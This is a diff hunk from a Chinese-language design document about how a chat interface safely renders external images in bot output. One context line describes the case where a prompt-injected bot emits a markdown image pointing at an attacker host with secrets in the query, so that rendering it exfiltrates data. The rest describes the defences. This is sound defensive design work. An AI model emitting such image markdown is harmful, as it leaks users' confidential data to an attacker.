@@ -1138,7 +1138,7 @@ agy 額度格只顯示 Gemini 的 `agy` key：桌機完整列出 `5h` 與 `7d`�
 
 bot 會讀外部內容；被 prompt injection 後只要輸出 `![](https://攻擊者/collect?d=機密)`，瀏覽器一渲染就替它把資料送出去。
 
-- **http(s) 圖片先畫佔位、點了才載入**：「🖼 外部圖片（網域）— 載入圖片」；網址帶很長的 query／fragment 或帳密時多一句警告（正常圖片網址很少那樣）。
+- **http(s) 圖片先畫佔位、點了才載入**：「🖼 外部圖片（網域）— 載入圖片」；網址帶很長的 query／fragment 或帳密時多一句警告（正常圖片網址很少那樣）。換了圖片網址就重新要求授權，不沿用上一張的結果（#1801）。
   daemon 自己的 `local-image`（專案目錄裡的檔）與 `data:` 圖片（行內資料、不會發請求）照常直接顯示。輸出中的氣泡（`LiveBubble`）與完成的訊息走同一個 `MarkdownImage`。
 - **載入方式＝瀏覽器 `fetch`→blob**（不帶 cookie、不帶 Referer；只收 png／jpeg／gif／webp／avif／bmp，blob 用白名單型別重包；上限 10 MB，Content-Length 先看、串流邊讀邊數）。**不收 SVG**：blob 繼承 app 的 origin，點圖在新分頁開 blob 時 SVG 裡的 `<script>` 會在 app 的 origin 執行、拿得到 UI token（審查時真瀏覽器重現）。本機／內網位址（localhost、127/8、10/8、172.16/12、192.168/16、169.254/16、`.local`、ULA／link-local）的佔位多一句警告，失敗就改成「在新分頁開啟」的連結（使用者自己點的連結）。
   不做 daemon 代理：代理要在使用者機器上替任意網址發請求，得另外擋 SSRF（內網／loopback／DNS rebinding／轉址），攻擊面比這個問題本身還大；代價是對方沒開 CORS 的圖只能新分頁看。
